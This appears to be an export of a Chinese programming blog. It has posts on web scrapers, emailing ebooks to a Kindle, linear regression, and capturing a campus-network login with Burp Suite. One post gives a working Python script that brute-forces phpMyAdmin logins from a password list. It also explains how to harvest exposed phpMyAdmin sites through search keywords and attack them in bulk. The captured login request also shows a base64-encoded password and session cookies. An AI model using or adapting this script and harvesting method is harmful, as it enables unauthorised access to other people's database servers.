class="keyword">yield</span>&#123;</span><br><span class="line">            <span class="string">'index'</span>:item[<span class="number">0</span>],</span><br><span class="line">            <span class="string">'image'</span>:item[<span class="number">1</span>],</span><br><span class="line">            <span class="string">'title'</span>:item[<span class="number">2</span>].strip(),</span><br><span class="line">            <span class="string">'actor'</span>:item[<span class="number">3</span>].strip()[<span class="number">3</span>:] <span class="keyword">if</span> len(item[<span class="number">3</span>])&gt;<span class="number">3</span> <span class="keyword">else</span> <span class="string">''</span>,</span><br><span class="line">            <span class="string">'time'</span>:item[<span class="number">4</span>].strip()[<span class="number">5</span>:] <span class="keyword">if</span> len(item[<span class="number">4</span>])&gt;<span class="number">5</span> <span class="keyword">else</span> <span class="string">''</span>,</span><br><span class="line">            <span class="string">'score'</span>:item[<span class="number">5</span>]+item[<span class="number">6</span>]</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_file</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'result.txt'</span>,<span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(json.dumps(content,ensure_ascii=<span class="literal">False</span>)+<span class="string">'\n'</span>)      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(offset)</span>:</span></span><br><span class="line">    url=<span class="string">'http://maoyan.com/board/4?offset='</span>+str(offset)</span><br><span class="line">    html=get_one_page(url)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> parse_one_page(html):</span><br><span class="line">        print(item)</span><br><span class="line">        write_to_file(item)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        main(offset=i*<span class="number">10</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手写python爬虫下载电子书一键发送到kindle</title>
      <link href="/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/"/>
      <url>/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/</url>
      
        <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>由于平时喜欢看书，但是发现一些推送的服务号没有自己想要的电子书，最近再学习爬虫，就想小试牛刀，主要用到的技术：</p><p>使用<code>python</code>的<code>requests</code>模块进行网站信息的爬取</p><p>解析我使用了两个方式，正则表达式和<code>pyquery</code>库进行<code>html</code>的解析</p><p>由于<code>kindle</code>推送，主要使用的是邮箱发送的方式，所以使用<code>python</code>已经封装好的<code>email</code>模块和<code>smtplib</code>模块，发送附件至你的<code>kindle</code>邮箱<br>主要的功能模块实现：</p><p>检索书籍然后推送至<code>kindle</code><br>排行榜推送至<code>kindle</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21b86yodbj31gs0rzq55.jpg" alt><br><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21b86vr1nj30zh0iajsv.jpg" alt></p><h2 id="2-各模块实现"><a href="#2-各模块实现" class="headerlink" title="2.各模块实现"></a>2.各模块实现</h2><h3 id="2-1-排行榜采集模块"><a href="#2-1-排行榜采集模块" class="headerlink" title="2.1 排行榜采集模块"></a>2.1 排行榜采集模块</h3><p>采集网页信息<br>主要使用的是<code>requests</code>模块。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def spider_qishu(url,headers):</span><br><span class="line">    response=requests.get(url,headers=headers)</span><br><span class="line">    if response.status_code==200:</span><br><span class="line">        return response.text</span><br><span class="line">    return None</span><br></pre></td></tr></table></figure><p>函数功能：<code>get</code>请求将网页的内容读取</p><p>解析<code>html</code>中的关键信息，并将其返回</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tuijian</span><span class="params">(html)</span>:</span></span><br><span class="line">    result=re.findall(<span class="string">'&lt;font&gt;(.*?)&lt;/font&gt;.*?&lt;u style=.*?&lt;em&gt;(.*?)&lt;/em&gt;&lt;a href="(.*?)"&gt;(.*?)&lt;/a&gt;&lt;/u&gt;'</span>,html,re.S)</span><br><span class="line">    paihangbang=re.findall(<span class="string">'&lt;h2&gt;(.*?)&lt;/h2&gt;'</span>,html,re.S)</span><br><span class="line">    print(paihangbang[<span class="number">0</span>])</span><br><span class="line">    results=[]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        t=&#123;&#125;</span><br><span class="line">        t[<span class="string">'index'</span>]=item[<span class="number">0</span>]</span><br><span class="line">        t[<span class="string">'author'</span>]=item[<span class="number">1</span>]</span><br><span class="line">        t[<span class="string">'href'</span>]=item[<span class="number">2</span>]</span><br><span class="line">        t[<span class="string">'book_name'</span>]=item[<span class="number">3</span>]</span><br><span class="line">        results.append(t)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        print(<span class="string">'序号:'</span>+i[<span class="string">'index'</span>]+<span class="string">'  作者:'</span>+i[<span class="string">'author'</span>]+<span class="string">' 书名:'</span>+i[<span class="string">'book_name'</span>]+<span class="string">' 链接:'</span>+i[<span class="string">'href'</span>])</span><br><span class="line">    <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure><p>这里将解析的结果存放再<code>results</code>，<code>results</code>是一个列表，然后它的每个元素是一个字典，分别存储序号，作者，书名，以及书的链接，这个链接的网页存在着下载地址，下面我们还要将其爬取，解析其下载地址。</p><p>下载模块:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(number,results,base_url,headers)</span>:</span></span><br><span class="line">    number=int(number)<span class="number">-1</span></span><br><span class="line">    extend_url=results[number][<span class="string">'href'</span>]</span><br><span class="line">    url=base_url+extend_url</span><br><span class="line">    headers[<span class="string">'Referer'</span>]=url</span><br><span class="line">    response=requests.get(url)</span><br><span class="line">    content=response.content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    out=re.findall(<span class="string">'get_down_url.*?,\'(.*?)\','</span>,content,re.S)</span><br><span class="line">    download_url=out[<span class="number">0</span>]</span><br><span class="line">    print(download_url)</span><br><span class="line">    print(<span class="string">'正在下载请耐心等候。。。。。。。\n'</span>)</span><br><span class="line">    filename=results[number][<span class="string">'book_name'</span>]+<span class="string">'.txt'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(download_url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(r.content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(r.status_code)</span><br><span class="line">    <span class="keyword">except</span> RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br></pre></td></tr></table></figure><p>首先我们从链接地址中得到网页，然后用正则表达式解析网页获得下载地址，然后将其写入文件，最后使用我们封装的<code>send_email</code>函数将其发送至<code>kindle</code></p><p>总结：解析网页这边使用的是正则表达式，发现正则表达式很不方便，很容易写错，十分麻烦。所以推荐再解析库的使用上使用<code>lxml</code>模块，或者使用<code>pyquery</code>模块，两个的解析速度都很快，<code>beautiful soup</code>很慢，而且它的<code>css</code>选择器没有<code>pyquery</code>模块的强大，如果你对j<code>query</code>熟悉的话，推荐使用<code>pyquery</code>模块。</p><h3 id="2-2-检索下载电子书"><a href="#2-2-检索下载电子书" class="headerlink" title="2.2 检索下载电子书"></a>2.2 检索下载电子书</h3><p>思路还是和上面的一样，不过再解析<code>html</code>网页我使用的是<code>pyquery</code>模块，它主要是根据<code>css</code>选择节点，进行网页的解析，速度很快，而且很方便。</p><p>分页模块</p><p>当你搜索一本书的时候，可能相似的书有很多，网页会将其分页，我们使用<code>fiddler</code>分析网页的请求过程，首先网页会将<code>20</code>个书分为一页，然后再<code>get</code>请求的时候会添加一个<code>page</code>字段，所以我们首先得得到一共检索有<code>numbe</code>r本书，然后用<code>math</code>模块的<code>ceil</code>方法，对<code>number/20</code>取上，最后得到网页的页数，我们再迭代对每一页发出请求解析到每本书所在的链接。在做这个模块的时候，我不幸踩到了坑，网页的请求<code>url</code>地址中的<code>word</code>字段编码是<code>gb2312</code>,所以这边需要进行编码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_parse</span><span class="params">()</span>:</span></span><br><span class="line">    href=&#123;&#125;</span><br><span class="line">    name_href=&#123;&#125;</span><br><span class="line">    base_url=<span class="string">'http://www.qishu.cc/search.asp'</span></span><br><span class="line">    keyword=input(<span class="string">"请输入你要搜索的书籍:\n"</span>)</span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    data[<span class="string">'word'</span>]=keyword.encode(<span class="string">'gb2312'</span>)</span><br><span class="line">    response=requests.get(base_url,data=data)</span><br><span class="line">    doc=pq(response.text)</span><br><span class="line">    spans=doc(<span class="string">'#searchmain .searchResult span:first-child'</span>)</span><br><span class="line">    print(<span class="string">"一共拥有"</span>+spans.text()+<span class="string">"本书:\n"</span>)</span><br><span class="line">    numbers=int(spans.text())</span><br><span class="line">    pages=math.ceil(numbers/<span class="number">20</span>) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(pages):</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">        data[<span class="string">'page'</span>]=str(i)</span><br><span class="line">        new_response=requests.get(base_url,data=data)</span><br><span class="line">        links,names=search(new_response,href,name_href)</span><br><span class="line">    <span class="keyword">return</span> links,names</span><br></pre></td></tr></table></figure><p>检索所有书籍模块<br>使用循环迭代，将书籍打印出来，并存储所在的页面信息，书所在的链接，名字</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def search(response,href,name_href):</span><br><span class="line">    response.encoding=&apos;gb2312&apos;</span><br><span class="line">    doc=pq(response.text)</span><br><span class="line">    results=doc(&apos;#searchmain .searchTopic&apos;).items()</span><br><span class="line">    for result in results:</span><br><span class="line">        a=result.find(&apos;a&apos;).remove(&apos;font&apos;)</span><br><span class="line">        result.find(&apos;a&apos;).remove()</span><br><span class="line">        print(&apos;序号   &apos;+result.text().rstrip(&apos;、&apos;))</span><br><span class="line">        print(&apos;书名   &apos;+a.text())</span><br><span class="line">        print(&apos;链接   &apos;+a.attr(&apos;href&apos;))</span><br><span class="line">        href[result.text().rstrip(&apos;、&apos;)]=a.attr(&apos;href&apos;)</span><br><span class="line">        name_href[result.text().rstrip(&apos;、&apos;)]=a.text()</span><br><span class="line">    return href,name_href</span><br></pre></td></tr></table></figure><p>下载模块</p><p>使用上面得到的链接，然后找到书所在的页面，解析下载地址，然后写入文件，返回文件名</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_search</span><span class="params">(links,number,filename)</span>:</span></span><br><span class="line">    base_url=<span class="string">'http://www.qishu.cc'</span></span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> links.items():</span><br><span class="line">        <span class="keyword">if</span> key==number:</span><br><span class="line">            url=base_url+value</span><br><span class="line">    response=requests.get(url)</span><br><span class="line">    response.encoding=<span class="string">'gb2312'</span></span><br><span class="line">    content=pq(response.text)</span><br><span class="line">    temp=content(<span class="string">'#downAddress a:gt(0)'</span>).remove(<span class="string">'b'</span>)</span><br><span class="line">    download_url=temp.attr(<span class="string">'href'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(download_url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(r.content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(r.status_code)</span><br><span class="line">    <span class="keyword">except</span> RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    print(<span class="string">'下载完成'</span>)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br></pre></td></tr></table></figure><h3 id="2-3-邮箱推送模块"><a href="#2-3-邮箱推送模块" class="headerlink" title="2.3 邮箱推送模块"></a>2.3 邮箱推送模块</h3><p>下面只要将<code>qq</code>邮箱和<code>16</code>位授权码、<code>kindle</code>邮箱地址替换成你的就可以使用了,<code>send_mail</code>我将除了<code>filename</code>之外的所有形参设置成默认参数，这样不用调用的使用给他传值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> email.mime.multipart</span><br><span class="line"><span class="keyword">import</span> email.mime.text</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.mime.application <span class="keyword">import</span> MIMEApplication</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_email</span><span class="params">(filename,smtpHost=<span class="string">'smtp.qq.com'</span>, sendAddr=<span class="string">'qq邮箱'</span>, password=<span class="string">'16位授权码'</span>, recipientAddrs=<span class="string">'kindle邮箱地址'</span>, subject=<span class="string">'kindle推送'</span>, content=<span class="string">'推送小说'</span>)</span>:</span></span><br><span class="line">    msg = email.mime.multipart.MIMEMultipart()</span><br><span class="line">    msg[<span class="string">'from'</span>] = sendAddr</span><br><span class="line">    msg[<span class="string">'to'</span>] = recipientAddrs</span><br><span class="line">    msg[<span class="string">'subject'</span>] = subject</span><br><span class="line">    content = content</span><br><span class="line">    txt = email.mime.text.MIMEText(content, <span class="string">'plain'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">    msg.attach(txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    part = MIMEApplication(open(filename,<span class="string">'rb'</span>).read())</span><br><span class="line">    part.add_header(<span class="string">'Content-Disposition'</span>, <span class="string">'attachment'</span>, filename=filename)</span><br><span class="line">    msg.attach(part)</span><br><span class="line"></span><br><span class="line">    smtp = smtplib.SMTP()</span><br><span class="line">    smtp.connect(smtpHost, <span class="string">'25'</span>)</span><br><span class="line">    smtp.login(sendAddr, password)</span><br><span class="line">    smtp.sendmail(sendAddr, recipientAddrs, str(msg))</span><br><span class="line">    print(<span class="string">"发送成功！"</span>)</span><br><span class="line">    smtp.quit()</span><br></pre></td></tr></table></figure><p>总结:还可以在爬取分页数据的时候，采用多线程，这样就会速度很快，然后下载的时候可以做个进度条。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python批量爆破phpMyadmin</title>
      <link href="/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/"/>
      <url>/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="使用python实现phpMyadmin的批量爆破"><a href="#使用python实现phpMyadmin的批量爆破" class="headerlink" title="使用python实现phpMyadmin的批量爆破"></a>使用python实现phpMyadmin的批量爆破</h2><h3 id="0x01-脚本实现"><a href="#0x01-脚本实现" class="headerlink" title="0x01 脚本实现"></a>0x01 脚本实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(url,username,password)</span>:</span></span><br><span class="line">headers = &#123;<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"</span>&#125;</span><br><span class="line">session=requests.session()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">response=session.get(url,headers=headers)</span><br><span class="line">soup=bp(response.text,<span class="string">"lxml"</span>)</span><br><span class="line">my_Dict=&#123;<span class="string">"type"</span>:<span class="string">"hidden"</span>,<span class="string">"name"</span>:<span class="string">"token"</span>&#125;</span><br><span class="line">tiqu=soup.find(attrs=my_Dict)</span><br><span class="line">data=&#123;&#125;</span><br><span class="line">data[<span class="string">"token"</span>]=tiqu.get(<span class="string">"value"</span>,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> data==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"no token"</span></span><br><span class="line">data[<span class="string">'pma_username'</span>]=username</span><br><span class="line">data[<span class="string">'pma_password'</span>]=password</span><br><span class="line">index_url=url+<span class="string">"index.php"</span></span><br><span class="line">response1=session.post(url=index_url,data=data)</span><br><span class="line">htmls=response1.text</span><br><span class="line"><span class="keyword">if</span> <span class="string">"phpMyAdmin is more friendly with a "</span> <span class="keyword">in</span> htmls:</span><br><span class="line">print(<span class="string">"[+] username:&#123;0&#125;, password:&#123;1&#125;"</span>.format(username,password))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./Good.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> urls:</span><br><span class="line">host_t=urls.readlines()</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> host_t:</span><br><span class="line"><span class="keyword">if</span> url[<span class="number">-1</span>]==<span class="string">'\n'</span>:</span><br><span class="line">url=url[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"mima.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> mima:</span><br><span class="line">my_mima=mima.readlines()</span><br><span class="line"><span class="keyword">for</span> mima <span class="keyword">in</span> my_mima:</span><br><span class="line">username,password=mima.split(<span class="string">"|"</span>)</span><br><span class="line">print(<span class="string">"attack &#123;0&#125; use username:&#123;1&#125;|password:&#123;2&#125;"</span>.format(url,username,password))</span><br><span class="line">attack(url,username,password)</span><br></pre></td></tr></table></figure><h3 id="0x02-脚本的使用"><a href="#0x02-脚本的使用" class="headerlink" title="0x02 脚本的使用"></a>0x02 脚本的使用</h3><ul><li>先用批量采集工具采集url（关键词：“欢迎使用 phpMyadmin”）</li><li>将采集的url导出为Good.txt路径</li><li>然后密码的格式为:    root|toor  ，|左边为root,右边为toor</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> python黑客编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习之线性回归方法</title>
      <link href="/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/"/>
      <url>/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="1-多元线性回归"><a href="#1-多元线性回归" class="headerlink" title="1. 多元线性回归"></a>1. 多元线性回归</h2><p>以预测房子价格为例，房子的属性除了其面积大小外，这里还有房子楼层数、房子年龄、厅室数等。也就是说一个房子的特征将不只一个，而是多个。这里用<code>n</code>表示特征数目，<code>x(i)</code>表示的是训练集中第<code>i</code>个样本的特征向量，<code>x(i)j</code>表示的第<code>i</code>个样本的第<code>j</code>个特征值,同时为每个记录增加一个属性<code>x0=1</code>.对于这个预测房价的问题我们首先要估计未知参数<code>x0......xn</code>的值，为此我们进行<code>n</code>次独立观测，得到n组数据样本，将它们带入方程可以得到一个方程组，我们将其矩阵化表示。</p><h2 id="2-参数x0到xn的求解"><a href="#2-参数x0到xn的求解" class="headerlink" title="2.参数x0到xn的求解"></a>2.参数x0到xn的求解</h2><p>我们需要求得参数，需要使用参数的最小二乘估计，我们需要选择<code>x0-xn</code>的参数使残差平方和得到最小</p><p>残差平方和就是，实际值减去预测值的平方。</p><h3 id="2-1-梯度下降法"><a href="#2-1-梯度下降法" class="headerlink" title="2.1 梯度下降法"></a>2.1 梯度下降法</h3><p>梯度下降法：就是将残差平方和对每一个特征进行偏导，这个得到的倒数可以类似于一坡度，我们需要不断的根据这点的坡度逼近最低点，需要不停的进行迭代。在梯度下降之前，有时候数据不同特征之间存在很大的差距，有的范围在<code>1000-2000</code>之间，而有的仅在<code>0-10之</code>间，这时候就会使得大数吃小数的情况，同时使得数据不便处理，为了使得数据的范围大致相同，我们需要对数据进行归一化。目前有三种归一化方法：</p><p>1)<code>mapminmax</code>，最大最小化方法，缺点：当新数据加入的时候，可能导致<code>max</code>和<code>min</code>发生变化，需要重新定义。</p><p>2)<code>log</code>函数转换</p><p>3)<code>z-score</code> <code>normalization</code>:标准差标准化</p><p>算法原理：根据刚才得到的残差平方表示的方程组，对每一个特征的参数进行偏导，然后根据偏导不断迭代最终逼近残差最小的值，得到参数的估计值。</p><h3 id="2-2-利用归一化方程"><a href="#2-2-利用归一化方程" class="headerlink" title="2.2 利用归一化方程"></a>2.2 利用归一化方程</h3><p>刚才我们得到了残差平方和的式子，利用微积分的极值法，我们对每一个参数进行偏导使得等于0，得到一组方程组，将其表示成矩阵形式，移项等矩阵运算就得到归一化方程。</p><h3 id="2-3-两种求解方法的比较"><a href="#2-3-两种求解方法的比较" class="headerlink" title="2.3 两种求解方法的比较"></a>2.3 两种求解方法的比较</h3><p>1)梯度下降求解法：</p><p>优点：当<code>Features</code>数量很大的时候，就是特征数量很大的时候，梯度下降比归一化方程求解好。</p><p>缺点：需要将数据预处理，进行归一化，还要初始化学习速率，比较麻烦。</p><p>2)归一化方程：</p><p>优点：比较快速同时比较方便</p><p>缺点：当特征值特别多的时候比较慢，同时如果特征值之间存在多重共线性，导致x的转置乘以x将会没有逆矩阵，计算不出参数的估计值。</p><h2 id="3-回归方程和回归参数的显著性检验"><a href="#3-回归方程和回归参数的显著性检验" class="headerlink" title="3.回归方程和回归参数的显著性检验"></a>3.回归方程和回归参数的显著性检验</h2><p>我们通过上面建立的回归模型到底因变量和自变量是否存在线性关系？这个还需要们对其进行假设检验进行验证。</p><p>总离差平方和<code>SST</code>：数据的真实值<code>y</code>减去真实值的平均值的平方。反映了数据的波动性大小。<br>残差平方和<code>SSE</code>：真实值减去观测值的平方。 反映了除去<code>y</code>与<code>x</code>之间的线性关系之外的因素引起的数据y的波动。<br>回归平方和<code>SSR</code>：预测值减去真实值的平均值的平方。反映了线性拟合值与它们平均值的总偏差。</p><p>利用代数运算和正规方程组得到<code>SST=SSR+SSE</code>.所以<code>SSR</code>越大，说明由回归关系得到的观测值的波动性比例越大，就是说<code>y</code>与<code>x</code>的线性关系越显著，拟合效果越好。自由度相应的也需要进行分解，<code>n-1=(n-p-1)+p</code>最后基于自由度的分解，我们建立方差分析表。<code>SSR</code>均方差等于<code>MSR=SSR/P</code>,<code>MSE=SSE/(N-P-1)</code>,<code>F=MSR/MSE</code>。当假设<code>y</code>与<code>x1</code>,<code>x2</code>,…<code>xn</code>不存在线性关系时候，<code>F</code>服从于<code>F（p，n-p-1）</code>,尽管已经说明了<code>x</code>与<code>y</code>存在了线性关系，但是每一个特征值<code>x</code>都对<code>y</code>存在显著的影响吗？</p><p>所以我们还需要对其进行单个参数的假设检验。接下来我们需要一个拟合优度，它对于衡量模型对样本观测值的拟合程度，在总的离差平方和中，回归平方和占得比例越大，说明拟合效果越来越好，于是通过回归平方和与离差平方和的比例作为判优的标准。它越接近<code>1</code>，说明模型的拟合优度越高。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python自动登陆校园网</title>
      <link href="/2019/04/12/python-zi-dong-deng-lu-xiao-yuan-wang/"/>
      <url>/2019/04/12/python-zi-dong-deng-lu-xiao-yuan-wang/</url>
      
        <content type="html"><![CDATA[<p>由于每次打开电脑都要手动的登录校园网，导致很麻烦，所以写了一个爬虫来模拟浏览器自动登录校园网的功能</p><h2 id="1-使用Burpsuit对校园网登录界面进行抓包分析"><a href="#1-使用Burpsuit对校园网登录界面进行抓包分析" class="headerlink" title="1.使用Burpsuit对校园网登录界面进行抓包分析"></a>1.使用Burpsuit对校园网登录界面进行抓包分析</h2><p>简介：<code>burpsuite</code>是一款渗透工具，运行环境是<code>Java</code>，所以需要先配置,主要可以用来对<code>HTTP</code>协议的工具包进行分析，也可以扫描网站的漏洞，接下来我们就用它来对校园网登录界面进行一个抓包。</p><h2 id="1-1-设置浏览器代理"><a href="#1-1-设置浏览器代理" class="headerlink" title="1.1 设置浏览器代理"></a>1.1 设置浏览器代理</h2><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4me17q2j31780mztaq.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4mn5krcj30yz0ngmxc.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4mtmx08j30sg0j4dm0.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4n0lhg5j30sg0iyn5j.jpg" alt></p><p>代理，就是拦截到浏览器的前面将数据包截取下来。</p><h3 id="1-2-抓包分析"><a href="#1-2-抓包分析" class="headerlink" title="1.2 抓包分析"></a>1.2 抓包分析</h3><p>浏览器输入网址<code>http://10.10.1.6/srun_portal_pc.php?ac_id=1&amp;&amp;userurl=http://www.lzu.edu.cn</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4noqt36j308c04hq4f.jpg" alt></p><p>然后打开<code>burpsuite</code>，点击<code>forward</code>（前进），就是讲刚才浏览器进行的动作，发送的包截取下来。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4nv60kbj30z00kfdhb.jpg" alt></p><p>我们发现<code>post</code>一个表单到<code>auth_action.php</code>进行处理，在下面<code>cookie</code>里面有一个<code>login</code>还和上面一致。我们将报文复制一份进行分析，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /include/auth_action.php HTTP/1.1</span><br><span class="line">Host: 10.10.1.6</span><br><span class="line">Content-Length: 116</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://10.10.1.6</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Referer: http://10.10.1.6/srun_portal_pc.php?ac_id=1&amp;&amp;userurl=http://www.lzu.edu.cn</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAhTQz7gmzQkugXpBZMrQUGiPHbG7NW34vDounugHSLx5A8mO4foZDYk3gvuzEOm8oE2SVDxfjaQLfPK6S3nHNRFaSa5KKhD%252FBgYozWIuXKWglZ6pYHmbs0l2KSqBUsQnuEp%252Fth0bbc%252BjfILH2xC501DX3AWRxf9c4IHUiuZZvZAhRsJGqlP9ypVRn9Ii6bTg%253D%253D; language=en; login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAhTQz7gmzQkugXpBZMrQUGiPHbG7NW34vDounugHSLx5A8mO4foZDYk3gvuzEOm8oE2SVDxfjaQLfPK6S3nHNRFaSa5KKhD%252FBgYozWIuXKWglZ6pYHmbs0l2KSqBUsQnuEp%252Fth0bbc%252BjfILH2xC501DX3AWRxf9c4IHUiuZZvZAhRsJGqlP9ypVRn9Ii6bTg%253D%253D</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">action=login&amp;username=********&amp;domain=@cernet&amp;password=&#123;B&#125;MTk5NjEy&amp;ac_id=1&amp;user_ip=&amp;nas_ip=&amp;user_mac=&amp;save_me=1&amp;ajax=1</span><br></pre></td></tr></table></figure><p>下面是<code>post</code>出去的表单数据，<code>username</code>通过猜测肯定是用户名，然后<code>password</code>是密码，但是发现这个是一个加密的报文，我们来打开<code>firebug</code>查看下网页的<code>javascript</code>代码，发现是<code>base64</code>加密，<br><code>save_me</code>字段应该是是否记住密码，如果点击了记住密码就是<code>1</code>否则就是<code>0</code>，接下来我们验证一下这个密码字段是否是<code>base64</code>.</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4oac6qyj30z40ke0uj.jpg" alt></p><p>选中<code>password</code>字段，然后点击<code>send to decoder</code>，<code>decoder</code>是<code>burp</code>的一个编码解码模块，可以进行解码</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4ohgne3j30z90kigm7.jpg" alt></p><p>发现密码和输入的一致但是前面加了一个<code>{B}</code>，可能有什么标志位，接下来，我们继续对这个包进行分析，我们将它发送到<code>repeater</code>模块（中继器模块）可以对包进行修改。右击选中<code>send to repeater</code></p><p><img 